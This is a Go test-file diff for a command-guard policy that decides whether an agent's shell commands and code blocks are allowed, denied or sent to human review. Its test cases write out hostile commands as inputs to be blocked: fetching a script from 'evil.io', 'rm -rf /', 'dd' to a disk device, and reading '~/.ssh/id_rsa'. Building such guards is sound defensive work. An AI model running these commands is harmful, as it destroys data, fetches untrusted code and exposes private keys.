@@ -256,20 +256,20 @@ func TestExplicitAllowOverrideBeatsDenyDefault(t *testing.T) {
 	}
 }
 
-func TestHasRecursiveForce(t *testing.T) {
-	yes := [][]string{
+func TestRecursiveForceFlags(t *testing.T) {
+	both := [][]string{
 		{"-rf", "/"}, {"-fr", "x"}, {"-Rf", "x"}, {"-r", "-f", "x"},
 		{"--recursive", "--force", "x"}, {"-r", "--force", "x"},
 	}
-	for _, args := range yes {
-		if !hasRecursiveForce(args) {
-			t.Errorf("hasRecursiveForce(%v) = false, want true", args)
+	for _, args := range both {
+		if r, f := recursiveForceFlags(args); !r || !f {
+			t.Errorf("recursiveForceFlags(%v) = (%v, %v), want (true, true)", args, r, f)
 		}
 	}
-	no := [][]string{{"-r", "x"}, {"-f", "x"}, {"file"}, {"-v", "x"}}
-	for _, args := range no {
-		if hasRecursiveForce(args) {
-			t.Errorf("hasRecursiveForce(%v) = true, want false", args)
+	notBoth := [][]string{{"-r", "x"}, {"-f", "x"}, {"file"}, {"-v", "x"}}
+	for _, args := range notBoth {
+		if r, f := recursiveForceFlags(args); r && f {
+			t.Errorf("recursiveForceFlags(%v) = (true, true), want at most one", args)
 		}
 	}
 }
@@ -649,6 +649,343 @@ func TestRawIPv6OperandDeny(t *testing.T) {
 		if !hasRule(findings, ruleNetworkID) {
 			t.Errorf("%q: missing R-NET-001: %+v", cmd, findings)
 		}
+	}
+}
+
+// scanCode is a convenience for scanning execute_code blocks.
+func scanCode(t *testing.T, p *Policy, blocks []CodeBlock) ([]Finding, Decision) {
+	t.Helper()
+	var sb strings.Builder
+	for _, b := range blocks {
+		if sb.Len() > 0 {
+			sb.WriteByte('\n')
+		}
+		sb.WriteString(b.Code)
+	}
+	findings, decision, _ := p.scan(
+		ExecRequest{Command: sb.String(), CodeBlocks: blocks}, BackendCode)
+	return findings, decision
+}
+
+// TestCodeBlockShellFullScan pins that a shell-language execute_code block is
+// scanned like a real command: the network whitelist, dangerous-argument and
+// command-policy rules all apply, so code execution is not a bypass lane.
+func TestCodeBlockShellFullScan(t *testing.T) {
+	p := loadExamplePolicy(t)
+	cases := []struct {
+		name     string
+		block    CodeBlock
+		wantRule string
+	}{
+		{"network bypass", CodeBlock{Language: "bash", Code: "curl http://evil.io/x.sh"}, ruleNetworkID},
+		{"dangerous rm", CodeBlock{Language: "sh", Code: "rm -rf /"}, ruleDangerousID},
+		{"credential path", CodeBlock{Language: "shell", Code: "cat ~/.ssh/id_rsa"}, ruleCredID},
+		{"unlabeled treated as shell", CodeBlock{Code: "curl http://evil.io/x.sh"}, ruleNetworkID},
+	}
+	for _, tc := range cases {
+		t.Run(tc.name, func(t *testing.T) {
+			findings, decision := scanCode(t, p, []CodeBlock{tc.block})
+			if decision != DecisionDeny {
+				t.Errorf("decision = %q, want deny (findings: %+v)", decision, findings)
+			}
+			if !hasRule(findings, tc.wantRule) {
+				t.Errorf("missing %s: %+v", tc.wantRule, findings)
+			}
+		})
+	}
+
+	// A benign whitelisted shell block still allows.
+	findings, decision := scanCode(t, p,
+		[]CodeBlock{{Language: "bash", Code: "curl https://github.com/org/repo"}})
+	if decision != DecisionAllow {
+		t.Errorf("benign shell block should allow, got %q: %+v", decision, findings)
+	}
+
+	// An unparsable shell block fails closed via unparsable_action.
+	findings, decision = scanCode(t, p,
+		[]CodeBlock{{Language: "bash", Code: "curl $(cat /tmp/target)"}})
+	if decision != DecisionDeny {
+		t.Errorf("unparsable shell block should deny, got %q: %+v", decision, findings)
+	}
+	if !hasRule(findings, ruleShellID) {
+		t.Errorf("missing R-SHELL-001 for unparsable block: %+v", findings)
+	}
+}
+
+// TestCodeBlockBridgeAndURLs covers non-shell code: bridging into shell
+// execution routes to review, and URLs embedded in the source are checked
+// against the network whitelist.
+func TestCodeBlockBridgeAndURLs(t *testing.T) {
+	p := loadExamplePolicy(t)
+
+	// python os.system -> review (R-SHELL-001, medium).
+	findings, decision := scanCode(t, p, []CodeBlock{{
+		Language: "python",
+		Code:     `import os` + "\n" + `os.system("id")`,
+	}})
+	if decision != DecisionReview {
+		t.Errorf("bridge decision = %q, want needs_human_review: %+v", decision, findings)
+	}
+	if !hasRule(findings, ruleShellID) {
+		t.Errorf("missing R-SHELL-001 bridge finding: %+v", findings)
+	}
+
+	// A non-whitelisted URL in python code -> deny (R-NET-001).
+	findings, decision = scanCode(t, p, []CodeBlock{{
+		Language: "python",
+		Code:     `import urllib.request` + "\n" + `urllib.request.urlopen("http://evil.io/payload")`,
+	}})
+	if decision != DecisionDeny {
+		t.Errorf("code URL decision = %q, want deny: %+v", decision, findings)
+	}
+	if !hasRule(findings, ruleNetworkID) {
+		t.Errorf("missing R-NET-001 for code URL: %+v", findings)
+	}
+
+	// Whitelisted URL and no bridge -> allow.
+	_, decision = scanCode(t, p, []CodeBlock{{
+		Language: "python",
+		Code:     `print(open("data.txt").read())  # docs: https://github.com/org/repo`,
+	}})
+	if decision != DecisionAllow {
+		t.Errorf("benign python should allow, got %q", decision)
+	}
+}
+
+// TestWgetInputFileFailsClosed pins that the URL-list options, whose real
+// targets live in a file the guard cannot read, fail closed.
+func TestWgetInputFileFailsClosed(t *testing.T) {
+	p := loadExamplePolicy(t)
+	for _, cmd := range []string{
+		`wget --input-file=/tmp/urls`,
+		`wget -i /tmp/urls`,
+		`wget --input-file /tmp/urls https://github.com/a`,
+	} {
+		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
+		if decision != DecisionDeny {
+			t.Errorf("%q: decision = %q, want deny (findings: %+v)", cmd, decision, findings)
+		}
+		if !hasRule(findings, ruleNetworkID) {
+			t.Errorf("%q: missing R-NET-001: %+v", cmd, findings)
+		}
+	}
+}
+
+// TestDownloadNoTargetReview pins the fallback: a download command whose
+// target cannot be extracted at all is routed to review instead of silently
+// allowed.
+func TestDownloadNoTargetReview(t *testing.T) {
+	p := loadExamplePolicy(t)
+	findings, decision := scanCmd(t, p, BackendWorkspace, `wget --tries=3`)
+	if decision != DecisionReview {
+		t.Errorf("decision = %q, want needs_human_review (findings: %+v)", decision, findings)
+	}
+	if !hasRule(findings, ruleNetworkID) {
+		t.Errorf("missing R-NET-001 fallback finding: %+v", findings)
+	}
+}
+
+// TestRmRecursiveSystemWithoutForce pins that "rm -r /etc" is critical even
+// without -f: force is not what makes deleting a system tree destructive.
+func TestRmRecursiveSystemWithoutForce(t *testing.T) {
+	p := loadExamplePolicy(t)
+	findings, decision := scanCmd(t, p, BackendWorkspace, "rm -r /etc")
+	if decision != DecisionDeny {
+		t.Errorf("decision = %q, want deny", decision)
+	}
+	if !hasRule(findings, ruleDangerousID) {
+		t.Errorf("missing R-DEL-001 for rm -r /etc: %+v", findings)
+	}
+	// Plain recursive delete of a workspace path without force stays silent.
+	findings, _ = scanCmd(t, p, BackendWorkspace, "rm -r build")
+	for _, f := range findings {
+		if f.RuleID == ruleDangerousID {
+			t.Errorf("rm -r build must not trip R-DEL-001: %+v", findings)
+		}
+	}
+}
+
+// TestChmodRecursiveReview covers the recursive-chmod heuristic under a policy
+// that does not deny chmod outright (the default policy).
+func TestChmodRecursiveReview(t *testing.T) {
+	p := DefaultPolicy()
+	if err := p.compile(); err != nil {
+		t.Fatalf("compile: %v", err)
+	}
+	findings, decision := scanCmd(t, &p, BackendWorkspace, "chmod -R 777 .")
+	if decision != DecisionReview {
+		t.Errorf("decision = %q, want needs_human_review: %+v", decision, findings)
+	}
+	if !hasRule(findings, ruleDangerousID) {
+		t.Errorf("missing R-DEL-001 for chmod -R: %+v", findings)
+	}
+	// A symbolic mode with a lowercase r is not the recursive flag.
+	findings, _ = scanCmd(t, &p, BackendWorkspace, "chmod -r file.txt")
+	for _, f := range findings {
+		if f.RuleID == ruleDangerousID {
+			t.Errorf("chmod -r (mode) must not trip R-DEL-001: %+v", findings)
+		}
+	}
+}
+
+// TestWindowsSystemPaths pins that Windows drive roots and system directories
+// count as system paths for the rm escalation.
+func TestWindowsSystemPaths(t *testing.T) {
+	yes := []string{`C:\Windows`, `c:/windows/system32`, `C:\Program Files\App`, `C:`, `D:/`}
+	for _, p := range yes {
+		if !isRootOrSystem(p) {
+			t.Errorf("isRootOrSystem(%q) = false, want true", p)
+		}
+	}
+	no := []string{`C:\Users\dev\project`, `d:/work/repo`, "build", "./out"}
+	for _, p := range no {
+		if isRootOrSystem(p) {
+			t.Errorf("isRootOrSystem(%q) = true, want false", p)
+		}
+	}
+}
+
+// TestToolMetadataDestructiveReview pins R-META-001: a tool that publishes
+// destructive metadata is routed to review even when the command itself is
+// clean.
+func TestToolMetadataDestructiveReview(t *testing.T) {
+	p := loadExamplePolicy(t)
+	req := ExecRequest{Command: "ls", ToolDestructive: true}
+	findings, decision, _ := p.scan(req, BackendWorkspace)
+	if decision != DecisionReview {
+		t.Errorf("decision = %q, want needs_human_review: %+v", decision, findings)
+	}
+	if !hasRule(findings, ruleMetaID) {
+		t.Errorf("missing R-META-001: %+v", findings)
+	}
+	// Without the flag the same command allows.
+	if _, decision, _ = p.scan(ExecRequest{Command: "ls"}, BackendWorkspace); decision != DecisionAllow {
+		t.Errorf("non-destructive ls should allow, got %q", decision)
+	}
+}
+
+// TestSecretNameHeuristic pins the name-based key=value pattern for both the
+// command string and env overrides (the env key participates in the match).
+func TestSecretNameHeuristic(t *testing.T) {
+	p := loadExamplePolicy(t)
+	findings, decision := scanCmd(t, p, BackendWorkspace, `git push https://github.com/a --config password=hunter2`)
+	if !hasRule(findings, ruleSecretID) {
+		t.Errorf("missing R-SECRET-001 for password= in command: %+v", findings)
+	}
+	if decision != DecisionReview {
+		t.Errorf("decision = %q, want needs_human_review", decision)
+	}
+	req := ExecRequest{Command: "go test ./...", Env: map[string]string{"DB_PASSWORD": "hunter2"}}
+	findings, _, _ = p.scan(req, BackendWorkspace)
+	if !hasRule(findings, ruleSecretID) {
+		t.Errorf("missing R-SECRET-001 for secret-named env key: %+v", findings)
+	}
+}
+
+// TestResourceOutputAndConcurrency covers the head -c output cap, the
+// xargs/parallel worker thresholds and the string-multiplication heuristic.
+func TestResourceOutputAndConcurrency(t *testing.T) {
+	p := loadExamplePolicy(t) // max_output_bytes: 1048576
+	p.Commands.Allowed = append(p.Commands.Allowed, "head", "xargs", "parallel")
+	if err := p.compile(); err != nil {
+		t.Fatalf("compile: %v", err)
+	}
+	review := []string{
+		`head -c 999999999 big.bin`,
+		`head -c 2G big.bin`,
+		`parallel -j 64 echo`,
+		`parallel --jobs=0 echo`,
+	}
+	for _, cmd := range review {
+		findings, decision := scanCmd(t, p, BackendWorkspace, cmd)
+		if decision != DecisionReview {
+			t.Errorf("%q: decision = %q, want needs_human_review: %+v", cmd, decision, findings)
+		}
+		if !hasRule(findings, ruleResourceID) {
+			t.Errorf("%q: missing R-RES-001: %+v", cmd, findings)
+		}
+	}
+	// xargs is unconditionally denied by shellsafe as a re-executing wrapper,
+	// so the decision is deny either way; the concurrency finding must still
+	// surface as evidence.
+	for _, cmd := range []string{`xargs -P 32 grep x`, `xargs -P0 grep x`} {
+		findings, _ := scanCmd(t, p, BackendWorkspace, cmd)
+		if !hasRule(findings, ruleResourceID) {
+			t.Errorf("%q: missing R-RES-001: %+v", cmd, findings)
+		}
+	}
+	allow := []string{
+		`head -c 512 small.bin`,
+		`parallel -j 2 echo`,
+	}
+	for _, cmd := range allow {
+		if _, decision := scanCmd(t, p, BackendWorkspace, cmd); decision != DecisionAllow {
+			t.Errorf("%q should allow, got %q", cmd, decision)
+		}
+	}
+	// python print("x" * 10000000) via the raw-text heuristic.
+	findings, decision := scanCmd(t, p, BackendWorkspace, `python3 -c "print('x' * 10000000)"`)
+	if decision != DecisionReview {
+		t.Errorf("print-repeat decision = %q, want needs_human_review: %+v", decision, findings)
+	}
+	if !hasRule(findings, ruleResourceID) {
+		t.Errorf("missing R-RES-001 for print repeat: %+v", findings)
+	}
+}
+
+// TestReviewPipelinesKnob pins the opt-in commands.review_pipelines posture:
+// off keeps legitimate pipes allowed; on routes any multi-segment pipeline to
+// review.
+func TestReviewPipelinesKnob(t *testing.T) {
+	p := loadExamplePolicy(t) // review_pipelines: false
+	if _, decision := scanCmd(t, p, BackendWorkspace, "cat a.txt | grep x"); decision != DecisionAllow {
+		t.Errorf("knob off: legit pipe should allow, got %q", decision)
+	}
+	p.Commands.ReviewPipelines = true
+	findings, decision := scanCmd(t, p, BackendWorkspace, "cat a.txt | grep x")
+	if decision != DecisionReview {
+		t.Errorf("knob on: decision = %q, want needs_human_review: %+v", decision, findings)
+	}
+	if !hasRule(findings, ruleCmdID) {
+		t.Errorf("knob on: missing R-CMD-001 pipeline finding: %+v", findings)
+	}
+	if _, decision = scanCmd(t, p, BackendWorkspace, "ls -la"); decision != DecisionAllow {
+		t.Errorf("knob on: single command should still allow, got %q", decision)
+	}
+}
+
+// TestDefaultPolicyProtectiveBaseline pins the hardened out-of-the-box
+// defaults: destructive binaries, privilege escalation, credential paths and
+// secret shapes are caught without any policy file, while ordinary commands
+// still run (no allow-list).
+func TestDefaultPolicyProtectiveBaseline(t *testing.T) {
+	p := DefaultPolicy()
+	if err := p.compile(); err != nil {
+		t.Fatalf("compile: %v", err)
+	}
+	deny := map[string]string{
+		"sudo rm -rf /tmp/x":     ruleDangerousID,
+		"dd if=/dev/zero of=/dev/sda": ruleDangerousID,
+		"cat ~/.ssh/id_rsa":      ruleCredID,
+	}
+	for cmd, rule := range deny {
+		findings, decision := scanCmd(t, &p, BackendWorkspace, cmd)
+		if decision != DecisionDeny {
+			t.Errorf("%q: decision = %q, want deny: %+v", cmd, decision, findings)
+		}
+		if !hasRule(findings, rule) {
+			t.Errorf("%q: missing %s: %+v", cmd, rule, findings)
+		}
+	}
+	for _, cmd := range []string{"go test ./...", "ls -la", "git status"} {
+		if _, decision := scanCmd(t, &p, BackendWorkspace, cmd); decision != DecisionAllow {
+			t.Errorf("%q should allow under the default policy, got %q", cmd, decision)
+		}
+	}
+	// The default secret patterns include the OpenAI/Slack shapes.
+	findings, _ := scanCmd(t, &p, BackendWorkspace, "curl -H 'X-Key: sk-"+strings.Repeat("a", 20)+"' https://api.example.com")
+	if !hasRule(findings, ruleSecretID) {
+		t.Errorf("missing R-SECRET-001 for sk- token under defaults: %+v", findings)
 	}
 }
 
